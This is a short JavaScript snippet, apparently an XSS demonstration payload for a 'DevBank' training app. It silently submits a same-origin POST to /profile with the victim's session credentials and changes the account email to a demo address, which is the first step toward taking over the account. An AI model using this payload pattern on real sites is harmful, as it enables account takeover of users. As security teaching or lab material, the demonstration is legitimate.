(async function () {
    const newEmail = "xss-demo@devbank.local";

    const form = new URLSearchParams();
    form.set("email", newEmail);

    const response = await fetch("/profile", {
        method: "POST",
        credentials: "same-origin",
        body: form
    });

    if (response.ok || response.redirected) {
        console.log("DevBank XSS demo: profile request completed");
    }
})();